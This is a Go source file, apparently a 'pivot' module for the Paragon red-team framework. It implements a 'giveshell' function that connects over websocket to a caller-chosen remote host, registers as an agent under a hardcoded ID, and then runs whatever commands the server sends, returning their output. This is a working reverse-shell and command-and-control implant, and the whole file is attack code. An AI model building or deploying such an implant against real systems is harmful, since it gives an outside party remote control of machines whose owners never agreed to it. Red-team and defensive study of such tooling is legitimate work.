package pivot

import (
	"bytes"
	"fmt"
	"log"
	"net/url"
	"os/exec"
	"time"

	"github.com/gorilla/websocket"
	"github.com/kcarretto/paragon/pkg/script"
)

var debug bool = true
var timeoutMS int = 2000
var parallelism int = 1000
var portSelection string

var hideUnavailableHosts bool
var versionRequested bool

var uuid = "30064771073"

func giveshell(parser script.ArgParser) (script.Retval, error) {
	websocket_host, err := parser.GetString(0)
	if err != nil {
		return nil, err
	}
	shell_cmd, err := parser.GetString(1)
	if err != nil {
		return nil, err
	}
	websocket_path, err := parser.GetString(2)
	if err != nil {
		websocket_path = "/cmd"
		// return nil, err
	}
	websocket_scheme, err := parser.GetString(3)
	if err != nil {
		websocket_scheme = "ws"
		// return nil, err
	}

	retVal, retErr := Giveshell(websocket_host, shell_cmd, websocket_path, websocket_scheme)
	return script.WithError(retVal, retErr), nil
}

func Giveshell(websocket_host string, shell_cmd string, websocket_path string, websocket_scheme string) (string, error) {
	log.SetFlags(1)

	fmt.Println("Trying to give shell ", websocket_scheme, "://", websocket_host, websocket_path, " ", shell_cmd)

	//Configure websocket address
	u := url.URL{Scheme: websocket_scheme, Host: websocket_host, Path: websocket_path}
	log.Printf("connecting to %s", u.String())

	//Connect to websocket
	c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)
	if err != nil {
		log.Fatal("dial:", err)
	}
	defer c.Close()

	done := make(chan struct{})

	// Functiton to handle websocket connections
	go func() {
		defer close(done)
		// Register agent
		for {
			fmt.Printf("Registering agent %s", uuid)
			err := registerAgent(c)
			if err != nil {
				log.Printf("Error registering client:\n", err)
				time.Sleep(5 * time.Second)
				continue
			}
			break
		}
		// Wait for commands
		for {
			_, message, err := c.ReadMessage()
			if err != nil {
				log.Println("read:", err)
				return
			}
			wsMsg := &WsMsg{}
			err = WsMsgFromJson(string(message), wsMsg)
			if err != nil {
				log.Println("Error creating WsMsg from JSON:\n", err)
			}

			switch wsMsg.MsgType {
			case Registration:
				fmt.Println("Confusion")
			case Command:
				fmt.Println("Executing command ", wsMsg.Data)
				commandResponse, err := executeShellCommand(wsMsg.Data)
				if err != nil {
					log.Printf("Command execution failed.\n%s\n%s", wsMsg.Data, err)
				}
				log.Println("Response:\n", commandResponse)
				err = sendResponse(c, commandResponse)
			case Response:
				fmt.Println("Confusion")
			default:
				fmt.Println("No case")
			}

		}
	}()

	for {
		// Do nothing so the other thread keeps running.
		// Can probably remove other thread as only one is really being used.
	}
}

func registerAgent(conn *websocket.Conn) error {
	wsMsg := WsMsg{Uuid: string(uuid), Data: "register_me_please", SrcType: Agent}
	jsonRes, err := wsMsg.ToJson()
	if err != nil {
		log.Println("registerAgent wsMsg.ToJson():\n", err)
		return err
	}

	err = conn.WriteMessage(websocket.TextMessage, []byte(string(jsonRes)))
	if err != nil {
		log.Println("registerAgent conn.WriteMessage\n", err)
		return err
	}
	return nil
}

func sendResponse(conn *websocket.Conn, responseString string) error {
	wsMsg := WsMsg{Uuid: uuid, Data: responseString, SrcType: Agent, MsgType: 2}
	wsJsonMsg, err := wsMsg.ToJson()
	if err != nil {
		return err
	}
	err = conn.WriteMessage(websocket.TextMessage, []byte(string(wsJsonMsg)))
	return err
}

func executeShellCommand(command string) (string, error) {
	cmd := exec.Command(string(command))
	var out bytes.Buffer

	//Define where to save theh command stdout
	cmd.Stdout = &out
	err := cmd.Run()
	if err != nil {
		log.Fatal(err)
		return "", err
	}
	return string(out.String()), nil
}
